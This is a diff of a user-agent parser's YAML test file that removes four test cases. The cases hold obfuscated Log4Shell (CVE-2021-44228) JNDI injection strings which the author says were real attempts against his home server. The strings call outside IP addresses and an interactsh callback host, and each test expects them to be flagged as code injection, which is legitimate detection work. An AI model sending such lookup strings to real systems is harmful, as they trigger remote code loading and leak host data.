@@ -788,25 +788,3 @@ config:
       AgentVersionMajor                    : '55'
       AgentNameVersion                     : 'Chrome 55.0.2883.91'
       AgentNameVersionMajor                : 'Chrome 55'
-
-
-# Real attempts I got at home trying Apache Log4j RCE CVE-2021-44228
-- test:
-    input:
-      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.155.205.233:12344/Basic/Command/Base64/SSByZW1vdmVkIHRoZSBhY3R1YWwgaGFjay4=}'
-    expected: *isCodeInjection
-
-- test:
-    input:
-      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6rxxxx4qq.interactsh.com}'
-    expected: *isCodeInjection
-
-- test:
-    input:
-      user_agent_string: '${jndi:dns://45.83.64.1/securityscan-http80}'
-    expected: *isCodeInjection
-
-- test:
-    input:
-      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/SSByZW1vdmVkIHRoZSBhY3R1YWwgaGFjay4=}'
-    expected: *isCodeInjection
